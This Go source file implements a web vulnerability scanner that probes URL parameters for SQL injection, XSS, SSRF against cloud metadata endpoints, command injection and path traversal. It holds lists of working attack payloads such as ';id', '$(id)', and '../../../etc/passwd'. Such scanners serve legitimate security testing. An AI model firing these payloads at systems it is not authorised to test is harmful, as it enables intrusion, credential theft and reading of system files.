package detection

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type Result struct {
	VulnType   string  `json:"vuln_type"`
	Target     string  `json:"target"`
	Parameter  string  `json:"parameter"`
	Payload    string  `json:"payload"`
	Confidence float64 `json:"confidence"`
	Evidence   string  `json:"evidence"`
	Confirmed  bool    `json:"confirmed"`
}

type Detector struct {
	client  *http.Client
	timeout time.Duration
}

func NewDetector(timeout time.Duration) *Detector {
	return &Detector{
		client: &http.Client{
			Timeout: timeout,
			Transport: &http.Transport{
				DisableKeepAlives: true,
			},
		},
		timeout: timeout,
	}
}

func (d *Detector) doRequest(ctx context.Context, targetURL string, param string, payload string) (*http.Response, string, error) {
	u, err := url.Parse(targetURL)
	if err != nil {
		return nil, "", err
	}
	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
	if err != nil {
		return nil, "", err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := d.client.Do(req)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()

	limited := io.LimitReader(resp.Body, 65536)
	body, err := io.ReadAll(limited)
	if err != nil {
		return nil, "", err
	}

	return resp, string(body), nil
}

func (d *Detector) baseline(ctx context.Context, targetURL string, param string) (time.Duration, int, error) {
	start := time.Now()
	_, body, err := d.doRequest(ctx, targetURL, param, "1")
	elapsed := time.Since(start)
	if err != nil {
		return 0, 0, err
	}
	return elapsed, len(body), nil
}

var sqliErrorPatterns = []string{
	"SQL syntax", "mysql_fetch", "ORA-", "Microsoft OLE DB",
	"unclosed quotation mark", "PostgreSQL", "SQLite", "PGError",
	"mysql error", "driver error", "supplied argument is not a valid",
	"Warning: mysql", "Warning: pg_", "Warning: oci_",
	"MySQLSyntaxErrorException", "org.postgresql", "SQLSTATE",
	"Syntax error", "Division by zero", "unterminated quoted string",
}

var sqliTimePayloads = []string{
	"' OR SLEEP(5)--",
	"'; WAITFOR DELAY '00:00:05'--",
	"' OR pg_sleep(5)--",
	"' OR SLEEP(5) AND '1'='1",
	"1'; WAITFOR DELAY '00:00:05'--",
	"' OR pg_sleep(5)::text;",
}

var sqliErrorPayloads = []string{
	"'",
	"\"",
	")--",
	"';--",
	"' OR '1'='1",
	"\" OR \"1\"=\"1",
	"' AND '1'='2",
	"' UNION SELECT NULL--",
	"' UNION SELECT NULL,NULL--",
	"' UNION SELECT NULL,NULL,NULL--",
	"1' ORDER BY 1--",
	"1' ORDER BY 100--",
}

var sqliBoolPayloads = []struct {
	payload string
	result  bool
}{
	{"' OR '1'='1", true},
	{"' OR '1'='2", false},
	{"' AND '1'='1", true},
	{"' AND '1'='2", false},
	{"1' AND '1'='1", true},
	{"1' AND '1'='2", false},
}

func (d *Detector) DetectSQLi(ctx context.Context, targetURL string, param string) []Result {
	var results []Result

	baseTime, baseSize, err := d.baseline(ctx, targetURL, param)
	if err != nil {
		return nil
	}

	for _, payload := range sqliErrorPayloads {
		_, body, err := d.doRequest(ctx, targetURL, param, payload)
		if err != nil {
			continue
		}
		bodyLower := strings.ToLower(body)
		for _, pat := range sqliErrorPatterns {
			if strings.Contains(bodyLower, strings.ToLower(pat)) {
				results = append(results, Result{
					VulnType:   "SQL Injection",
					Target:     targetURL,
					Parameter:  param,
					Payload:    payload,
					Confidence: 0.9,
					Evidence:   fmt.Sprintf("SQL error pattern matched: %s", pat),
					Confirmed:  true,
				})
				break
			}
		}
	}

	if len(results) > 0 {
		return results
	}

	for _, payload := range sqliTimePayloads {
		start := time.Now()
		_, _, err := d.doRequest(ctx, targetURL, param, payload)
		elapsed := time.Since(start)
		if err != nil {
			continue
		}
		if elapsed > 4*time.Second && elapsed > baseTime*2 {
			results = append(results, Result{
				VulnType:   "SQL Injection (Time-based)",
				Target:     targetURL,
				Parameter:  param,
				Payload:    payload,
				Confidence: 0.8,
				Evidence:   fmt.Sprintf("Response time %.2fs vs baseline %.2fs", elapsed.Seconds(), baseTime.Seconds()),
				Confirmed:  true,
			})
		}
	}

	if len(results) > 0 {
		return results
	}

	for _, bp := range sqliBoolPayloads {
		_, body, err := d.doRequest(ctx, targetURL, param, bp.payload)
		if err != nil {
			continue
		}
		size := len(body)
		var diff int
		if size > baseSize {
			diff = size - baseSize
		} else {
			diff = baseSize - size
		}
		_ = bp.result
		if diff > 50 {
			results = append(results, Result{
				VulnType:   "SQL Injection (Boolean-based)",
				Target:     targetURL,
				Parameter:  param,
				Payload:    bp.payload,
				Confidence: 0.7,
				Evidence:   fmt.Sprintf("Response size %d vs baseline %d (diff %d)", size, baseSize, diff),
				Confirmed:  true,
			})
		}
	}

	return results
}

var xssPayloads = []string{
	"<script>alert(1)</script>",
	"\"><script>alert(1)</script>",
	"<img src=x onerror=alert(1)>",
	"{{constructor.constructor('alert(1)')()}}",
	"<svg/onload=alert(1)>",
	"javascript:alert(1)",
	"\"><svg/onload=alert(1)>",
	"'><script>alert(1)</script>",
	"<body onload=alert(1)>",
	"<input autofocus onfocus=alert(1)>",
	"<details open ontoggle=alert(1)>",
	"}}<script>alert(1)</script>{{",
}

func (d *Detector) DetectXSS(ctx context.Context, targetURL string, param string) []Result {
	var results []Result

	for _, payload := range xssPayloads {
		_, body, err := d.doRequest(ctx, targetURL, param, payload)
		if err != nil {
			continue
		}
		if strings.Contains(body, payload) {
			results = append(results, Result{
				VulnType:   "XSS",
				Target:     targetURL,
				Parameter:  param,
				Payload:    payload,
				Confidence: 0.9,
				Evidence:   "Payload reflected unescaped in response",
				Confirmed:  true,
			})
		} else {
			short := payload
			if len(short) > 20 {
				short = short[:20]
			}
			if strings.Contains(body, short) {
				results = append(results, Result{
					VulnType:   "XSS (Partial Reflection)",
					Target:     targetURL,
					Parameter:  param,
					Payload:    payload,
					Confidence: 0.6,
					Evidence:   "Partial payload reflection detected",
					Confirmed:  false,
				})
			}
		}
	}

	return results
}

var ssrfPayloads = []string{
	"http://127.0.0.1:80",
	"http://localhost:80",
	"http://[::1]:80",
	"http://0.0.0.0:80",
	"http://169.254.169.254/latest/meta-data/",
	"http://metadata.google.internal/",
	"http://100.100.100.200/latest/meta-data/",
}

var ssrfIndicators = []string{
	"root:", "meta-data", "dynamic", "instance-id", "public-hostname",
	"local-ipv4", "local-hostname", "e2e-256",
}

func (d *Detector) DetectSSRF(ctx context.Context, targetURL string, param string, oobURL string) []Result {
	var results []Result

	payloads := ssrfPayloads
	if oobURL != "" {
		payloads = append(payloads, oobURL)
	}

	baseTime, _, err := d.baseline(ctx, targetURL, param)
	if err != nil {
		baseTime = 500 * time.Millisecond
	}

	for _, payload := range payloads {
		start := time.Now()
		_, body, err := d.doRequest(ctx, targetURL, param, payload)
		elapsed := time.Since(start)
		if err != nil {
			continue
		}
		bodyLower := strings.ToLower(body)

		if payload == "http://169.254.169.254/latest/meta-data/" ||
			payload == "http://metadata.google.internal/" ||
			payload == "http://100.100.100.200/latest/meta-data/" {
			for _, ind := range ssrfIndicators {
				if strings.Contains(bodyLower, ind) {
					results = append(results, Result{
						VulnType:   "SSRF (Metadata Access)",
						Target:     targetURL,
						Parameter:  param,
						Payload:    payload,
						Confidence: 0.9,
						Evidence:   fmt.Sprintf("Cloud metadata indicator found: %s", ind),
						Confirmed:  true,
					})
					break
				}
			}
		}

		if elapsed > baseTime*3 && elapsed > 2*time.Second {
			results = append(results, Result{
				VulnType:   "SSRF (Time-based)",
				Target:     targetURL,
				Parameter:  param,
				Payload:    payload,
				Confidence: 0.5,
				Evidence:   fmt.Sprintf("Response time %.2fs vs baseline %.2fs", elapsed.Seconds(), baseTime.Seconds()),
				Confirmed:  false,
			})
		}
	}

	return results
}

var cmdPayloads = []string{
	";id",
	"|id",
	"`id`",
	"$(id)",
	"& id",
	";sleep 5",
	"| ping -c 5 127.0.0.1",
	"& ping -n 5 127.0.0.1",
	";whoami",
	"|whoami",
	";echo test123",
	"|echo test123",
}

var cmdIndicators = []string{
	"uid=", "gid=", "root:", "bin:", "daemon:",
	"test123",
}

func (d *Detector) DetectCmdInjection(ctx context.Context, targetURL string, param string) []Result {
	var results []Result

	baseTime, _, err := d.baseline(ctx, targetURL, param)
	if err != nil {
		baseTime = 500 * time.Millisecond
	}

	for _, payload := range cmdPayloads {
		start := time.Now()
		_, body, err := d.doRequest(ctx, targetURL, param, payload)
		elapsed := time.Since(start)
		if err != nil {
			continue
		}
		bodyLower := strings.ToLower(body)

		for _, ind := range cmdIndicators {
			if strings.Contains(bodyLower, ind) {
				results = append(results, Result{
					VulnType:   "Command Injection",
					Target:     targetURL,
					Parameter:  param,
					Payload:    payload,
					Confidence: 0.95,
					Evidence:   fmt.Sprintf("Command output indicator found: %s", ind),
					Confirmed:  true,
				})
				break
			}
		}

		if len(results) > 0 {
			break
		}

		isTimePayload := strings.Contains(payload, "sleep") || strings.Contains(payload, "ping")
		if isTimePayload && elapsed > 4*time.Second && elapsed > baseTime*2 {
			results = append(results, Result{
				VulnType:   "Command Injection (Blind)",
				Target:     targetURL,
				Parameter:  param,
				Payload:    payload,
				Confidence: 0.7,
				Evidence:   fmt.Sprintf("Response time %.2fs vs baseline %.2fs", elapsed.Seconds(), baseTime.Seconds()),
				Confirmed:  true,
			})
		}
	}

	return results
}

var ptPayloads = []string{
	"../../../etc/passwd",
	"..\\..\\..\\windows\\win.ini",
	"....//....//....//etc/passwd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
	"..%252f..%252f..%252fetc%252fpasswd",
	"..\\..\\..\\..\\etc\\passwd",
	"../../../etc/hosts",
	"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
}

var ptIndicators = []struct {
	pattern  string
	vulnType string
}{
	{"root:x:", "Unix passwd"},
	{"[fonts]", "Windows win.ini"},
	{"localhost", "Hosts file"},
	{"127.0.0.1", "Hosts file"},
	{"::1", "Hosts file"},
	{"bin:", "Unix passwd"},
	{"daemon:", "Unix passwd"},
	{"nobody:", "Unix passwd"},
	{"sshd:", "Unix passwd"},
	{"[mail]", "Windows win.ini"},
	{" extensions", "Windows win.ini"},
}

func (d *Detector) DetectPathTraversal(ctx context.Context, targetURL string, param string) []Result {
	var results []Result

	_, baseSize, err := d.baseline(ctx, targetURL, param)
	if err != nil {
		baseSize = 0
	}

	for _, payload := range ptPayloads {
		_, body, err := d.doRequest(ctx, targetURL, param, payload)
		if err != nil {
			continue
		}
		bodyLower := strings.ToLower(body)

		for _, ind := range ptIndicators {
			if strings.Contains(bodyLower, ind.pattern) {
				results = append(results, Result{
					VulnType:   "Path Traversal (" + ind.vulnType + ")",
					Target:     targetURL,
					Parameter:  param,
					Payload:    payload,
					Confidence: 0.95,
					Evidence:   fmt.Sprintf("File content indicator found: %s", ind.pattern),
					Confirmed:  true,
				})
				break
			}
		}

		if len(results) > 0 {
			break
		}

		size := len(body)
		var diff int
		if size > baseSize {
			diff = size - baseSize
		} else {
			diff = baseSize - size
		}
		if baseSize > 0 && diff > 100 {
			results = append(results, Result{
				VulnType:   "Path Traversal (Size Difference)",
				Target:     targetURL,
				Parameter:  param,
				Payload:    payload,
				Confidence: 0.5,
				Evidence:   fmt.Sprintf("Response size %d vs baseline %d (diff %d)", size, baseSize, diff),
				Confirmed:  false,
			})
		}
	}

	return results
}

func (d *Detector) ScanURL(targetURL string, params []string) []Result {
	var allResults []Result

	for _, param := range params {
		ctx, cancel := context.WithTimeout(context.Background(), d.timeout)

		sqliResults := d.DetectSQLi(ctx, targetURL, param)
		allResults = append(allResults, sqliResults...)

		xssResults := d.DetectXSS(ctx, targetURL, param)
		allResults = append(allResults, xssResults...)

		ssrfResults := d.DetectSSRF(ctx, targetURL, param, "")
		allResults = append(allResults, ssrfResults...)

		cmdResults := d.DetectCmdInjection(ctx, targetURL, param)
		allResults = append(allResults, cmdResults...)

		ptResults := d.DetectPathTraversal(ctx, targetURL, param)
		allResults = append(allResults, ptResults...)

		cancel()
	}

	return allResults
}
